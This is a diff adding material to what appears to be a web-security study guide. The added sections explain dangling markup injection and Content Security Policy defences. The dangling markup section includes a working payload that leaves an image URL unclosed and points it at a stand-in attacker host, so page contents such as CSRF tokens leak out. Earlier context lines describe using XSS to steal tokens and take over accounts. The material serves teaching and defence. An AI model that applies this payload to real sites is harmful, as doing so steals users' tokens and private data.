@@ -1525,3 +1525,89 @@ Think of this like breaking into a high-security vault by subverting the alarm s
 1. **The Secret Guard (CSRF Tokens):** The website uses unique, hidden tokens on every form to prove a request came from a genuine button click, blocking traditional forged attacks.
 2. **The Insider Threat (XSS):** Because your XSS script is running live inside the victim's browser, it doesn't need to guess the token; it can just read it straight off the DOM.
 3. **The Silent Takeover:** The script steals the token, quietly updates the account's email address behind the scenes, and triggers a password reset—all without the victim ever noticing until they are locked out!
+
+
+### 🕵️ Attack Style: Dangling Markup Injection (The Page-Sucking Trap)
+
+**The Goal:** Exfiltrate sensitive cross-domain page data (like CSRF tokens, emails, or financial records) when full XSS is blocked, by tricking the browser into swallowing and leaking the rest of the HTML document.
+
+---
+
+#### 🧩 Concept: When You Can't Execute Code, Steal Data
+
+* **The Scenario:** You find an input injection point that allows you to break out of quotes (`"`) and tags (`>`), but strong Content Security Policies (CSP) or strict filters prevent you from running JavaScript (`alert`, `fetch`, etc.).
+* **The "Dangling" Trick:** Instead of injecting code, you inject an **unclosed HTML attribute** (a tag left hanging or "dangling").
+* **How the Browser Gets Tricked:** When a browser parses a broken tag like an image source (`src`), it looks ahead through the rest of the webpage until it encounters a matching closing quote. **Everything in between**—including hidden inputs, user data, and secret tokens—gets swallowed up and treated as part of the URL!
+
+---
+
+#### 🛠️ The Payload & How It Works
+
+* **Vulnerable Setup:**
+```html
+<input type="text" name="input" value="CONTROLLABLE DATA HERE">
+
+```
+
+
+* **The Payload:**
+```text
+"><img src='//attacker-website.com?
+
+```
+
+
+* **Resulting HTML Code:**
+```html
+<input type="text" name="input" value=""><img src='//attacker-website.com? [REST OF THE WEBPAGE CONTENT CONTINUES UNTIL THE NEXT SINGLE QUOTE IS FOUND]
+
+```
+
+
+
+---
+
+#### 🎯 Plain-English Breakdown of the Attack
+
+Think of this like casting a massive digital net to catch whatever data is lying around:
+
+1. **The Breakout (`">`):** You use a quote and a closing bracket to escape the original input field and return to normal HTML context.
+2. **The Bait (`<img src='//attacker-website.com?`):** You plant an image tag pointing to your external server, but you **deliberately leave the single quote unclosed** (dangling).
+3. **The Accidental Theft:** The browser tries to be helpful. It starts scanning forward to find the matching quote to complete the URL, slurping up all the sensitive tokens, private emails, and user data that follow your injection point.
+4. **The Exfiltration:** The browser packages the entire chunk of stolen webpage text into a URL query string and beams it straight to your server!
+
+### 🛡️ Defense Style: Content Security Policy (The Browser's Lockdown Guard)
+
+**The Goal:** Understand how Content Security Policy (CSP) acts as a security shield to block script injection and data exfiltration, while recognizing the subtle blind spots attackers look to exploit.
+
+---
+
+#### 🧩 Concept: The App's Bodyguard
+
+* **What is CSP?** A powerful browser security mechanism delivered via an HTTP header (`Content-Security-Policy`). It tells the browser strict rules about what resources (scripts, images, styles) are allowed to load and run on the page.
+* **The Rules (Directives):**
+* `script-src 'self'` → Only allow scripts from the website's own origin.
+* `script-src [https://trusted.com](https://trusted.com)` → Only allow scripts from a specific external domain (though unsafe CDNs can introduce vulnerabilities if third parties control content there).
+
+
+* **The Elite Defenses (Nonces & Hashes):** Instead of trusting domains, modern apps use **Nonces** (a random crypto token generated fresh on every page load that must match the script tag) or **Hashes** (a cryptographic fingerprint of the exact script contents) to ensure unauthorized code never executes.
+
+---
+
+#### ⚠️ The Bypasses & Real-World Realities
+
+Even with a strict CSP in place, web applications often leave small gaps:
+
+1. **The Image Loophole:** Many CSPs block external scripts but accidentally allow external image loads (`img-src *`). Attackers exploit this via dangling markup to leak data through image requests.
+2. **Browser Mitigations:** Modern browsers (like Chrome) fight back by automatically blocking dangling markup requests that contain raw newlines or angle brackets.
+3. **The User Interaction Fallback:** If a policy locks down all automatic external requests, attackers resort to injecting clickable HTML elements that rely on a user's click to manually store and exfiltrate data.
+
+---
+
+#### 🎯 Plain-English Breakdown of the Mechanism
+
+Think of CSP like a high-security corporate building's entry protocol:
+
+1. **The Badge Checker:** The browser checks every script and image against a strict guest list provided by the server (`Content-Security-Policy`).
+2. **The Cryptographic Lock:** If a script doesn't have the correct rotating passcode (nonce) or fingerprint (hash), the browser refuses to let it run.
+3. **The Blind Spots:** Even if the guards check every script at the front door, side-doors like image tags or user-clicked links are sometimes left unguarded, giving attackers creative ways to leak data anyway!
